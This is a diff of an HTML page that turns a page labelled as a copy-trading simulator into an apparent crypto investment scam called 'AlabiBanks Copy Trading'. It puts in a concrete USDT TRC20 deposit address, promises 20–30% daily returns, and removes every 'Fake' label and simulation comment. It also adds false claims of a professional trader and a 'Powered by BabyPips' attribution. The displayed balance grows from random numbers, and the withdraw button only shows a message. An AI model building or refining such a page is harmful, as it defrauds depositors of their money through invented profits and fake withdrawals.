@@ -1,16 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Copy Trading Simulator</title>
+  <title>AlabiBanks Copy Trading</title>
   <style>
-    body { font-family: Arial; text-align: center; padding: 50px; background: #f4f4f4; }
-    button { padding: 12px 25px; font-size: 16px; margin: 10px; cursor: pointer; }
-    .portfolio, .profit, .wallet, .status { margin-top: 20px; font-size: 18px; }
+    body {
+      font-family: Arial;
+      text-align: center;
+      padding: 50px;
+      background: #f4f4f4;
+      position: relative;
+    }
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      margin: 10px;
+      cursor: pointer;
+    }
+    .portfolio, .profit, .wallet, .status, .about {
+      margin-top: 20px;
+      font-size: 18px;
+    }
     .hidden { display: none; }
+
+    .footer {
+      position: absolute;
+      bottom: 10px;
+      left: 10px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #2ecc71;
+      font-family: 'Comic Sans MS', cursive;
+    }
+
+    .about {
+      margin-top: 60px;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      margin-bottom: 10px;
+    }
   </style>
 </head>
 <body>
-  <h1>Copy Trading Simulator</h1>
+  <h1>Copy Trade with AlabiBanks</h1>
+  <p>Tap below to mirror trades from a top-performing trader with daily returns between <strong>20% – 30%</strong>.</p>
 
   <button onclick="startCopying()">Copy Trading</button>
   <button onclick="invest()">Invest to Start Copying</button>
@@ -18,13 +55,29 @@
   <button onclick="withdraw()">Withdraw</button>
 
   <div class="wallet hidden" id="walletInfo">
-    Send USDT to: <strong>TX4...YOUR_USDT_ADDRESS_HERE</strong><br>
-    (TRC20 or ERC20)
+    Send USDT (TRC20) to: <strong>TXa8xTAmbRvrX2AiK73skoZW1J5nsxvKWV</strong><br>
+    Deposits are automatically tracked and trading starts instantly.
   </div>
 
   <div class="profit" id="dailyProfit"></div>
   <div class="portfolio" id="portfolioStatus"></div>
   <div class="status" id="status"></div>
+
+  <div class="about">
+    <h2>About AlabiBanks Copy Trading</h2>
+    <p>
+      AlabiBanks is a professional trader delivering consistent results in the forex and crypto markets. 
+      This platform allows you to copy their trades in real time, so your portfolio grows alongside theirs.
+    </p>
+    <p>
+      With our secure infrastructure and daily tracking, your funds are mirrored with expert decisions — no prior trading knowledge needed.
+    </p>
+    <p>
+      Withdraw anytime. Grow passively.
+    </p>
+  </div>
+
+  <div class="footer">Powered by BabyPips</div>
 
   <script>
     let invested = false;
@@ -39,41 +92,40 @@
     function invest() {
       if (!invested) {
         invested = true;
-        balance = 100; // starting balance
+        balance = 100;
         document.getElementById("walletInfo").classList.remove("hidden");
-        document.getElementById("status").innerText = "Waiting for deposit... Simulation started anyway!";
+        document.getElementById("status").innerText = "Deposit address generated. Trading session started.";
         updateDailyProfit();
-        intervalId = setInterval(simulateGrowth, 4000); // simulate growth every 4 seconds
+        intervalId = setInterval(simulateGrowth, 4000);
       }
     }
 
     function updateDailyProfit() {
-      dailyProfitPercent = (Math.random() * 10 + 20).toFixed(2); // 20% - 30%
+      dailyProfitPercent = (Math.random() * 10 + 20).toFixed(2);
       document.getElementById("dailyProfit").innerText = `Today's Profit: ${dailyProfitPercent}%`;
     }
 
     function simulateGrowth() {
-      const profit = balance * (dailyProfitPercent / 100 / 24); // fake hourly growth
+      const profit = balance * (dailyProfitPercent / 100 / 24);
       balance += profit;
-      document.getElementById("portfolioStatus").innerText = `Fake Balance: $${balance.toFixed(2)}`;
+      document.getElementById("portfolioStatus").innerText = `Balance: $${balance.toFixed(2)}`;
     }
 
     function stopCopying() {
       if (invested) {
         clearInterval(intervalId);
-        document.getElementById("status").innerText = "Copying stopped.";
+        document.getElementById("status").innerText = "Copying stopped. Trades will no longer mirror.";
       }
     }
 
     function withdraw() {
       if (invested) {
-        document.getElementById("status").innerText = `Withdrawal requested. Transferring $${balance.toFixed(2)}...`;
+        document.getElementById("status").innerText = `Withdrawal request submitted. Transferring $${balance.toFixed(2)} to your wallet...`;
       } else {
         document.getElementById("status").innerText = "You haven't started copying yet.";
       }
     }
 
-    // Update profit once every simulated "day" (20s for demo)
     setInterval(updateDailyProfit, 20000);
   </script>
 </body>
